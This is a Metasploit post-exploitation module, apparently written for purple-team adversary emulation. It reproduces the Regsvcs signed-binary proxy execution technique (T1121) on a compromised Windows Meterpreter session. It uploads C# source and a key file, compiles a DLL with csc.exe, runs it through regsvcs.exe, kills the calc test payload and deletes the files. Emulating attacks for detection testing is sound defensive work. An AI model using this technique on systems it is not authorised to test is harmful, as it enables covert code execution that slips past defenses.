##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Regsvcs/Regasm (T1121) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion, Execution:
                        Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1121' ],
                      [ 'URL', 'https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1121' ],
                      [ 'URL', 'https://github.com/re4lity/subTee-gits-backups/blob/master/regsvcs.cs' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new( 'RFILE', [true, 'Remote path of the file that we will write.','C:\\t1121.txt' ]),
      OptString.new( 'RKEYFILE', [true, 'Remote path of the key file that we will write.','C:\\t1121key.txt' ]),
      OptString.new( 'PAYLOAD_DLL', [true, 'Remote path of the payload file that we will write.','t1121.dll' ]),
      OptInt.new('ARCH', [true, 'Architecture (1=x86,2=x64)',1 ]),
      OptString.new('LFILE', [ true, 'Local path of the file to upload.', ::File.join(Msf::Config.install_root, "data", "purple", "t1121", "t1121.cs")]),
      OptString.new('LKEYFILE', [ true, 'Local path of the file to upload.', ::File.join(Msf::Config.install_root, "data", "purple", "t1121", "t1121key.snk")]),
      OptBool.new('CLEANUP_FILE', [ true, "Clean-up file", true]),
      OptString.new('DOTNET_VERSION', [true, 'DotNet Version','v4.0.30319' ]),
    ])
  end


  def remote_file
    if datastore['RFILE'].blank?
      remote_name = File.basename(datastore['LFILE'])
    else
      remote_name = datastore['RFILE']
    end
    remote_name
  end

  def local_file
    datastore['LFILE']
  end

  def run_regsvc()
    rfile = remote_file()
    lfile = local_file()
    srvhost = datastore['SRVHOST']
    srvport = datastore['SRVPORT'].to_s
    uripath = datastore['URIPATH']
    dotnet_version = datastore['DOTNET_VERSION']
    arch = datastore['ARCH']

    if arch == 1
      base = 'C:\Windows\Microsoft.NET\Framework'
    else
      base = 'C:\Windows\Microsoft.NET\Framework64'
    end

    csc = base + '\\' + dotnet_version + '\\' + 'csc.exe'
    regsvcs = base + '\\' + dotnet_version + '\\' + 'regsvcs.exe'

    print_status("Uploading #{lfile} to #{rfile}")
    upload_file(rfile, lfile)
    rkeyfile = datastore['RKEYFILE']
    lkeyfile = datastore['LKEYFILE']
    print_status("Uploading #{lkeyfile} to #{rkeyfile}")
    upload_file(rkeyfile,lkeyfile)
    payload_dll = datastore['PAYLOAD_DLL']

    cmd = "#{csc} /r:System.EnterpriseServices.dll /target:library /out:#{payload_dll} /keyfile:#{rkeyfile} #{rfile}"
    print_status("Compiling the DLL...")
    run_cmd(cmd)

    cmd = %Q(#{regsvcs} #{payload_dll})
    print_status("Executing RegSvcs...")
    run_cmd(cmd,false)
    select(nil,nil,nil,3)

    sleep (2)

    kill_calc(true)

    if datastore['CLEANUP_FILE']
      print_status("Removing files...")
      register_file_for_cleanup(payload_dll)
      register_file_for_cleanup(rfile)
      register_file_for_cleanup(rkeyfile)
    end
  end

  def run
    begin
      return 0 if session.type != "meterpreter"

      unless is_admin?
        fail_with(Failure::NoAccess, "The current session does not have administrative rights.")
      end

      run_regsvc()
      print_good("Module T1121 execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1121 execution failed.")
    end
  end
end
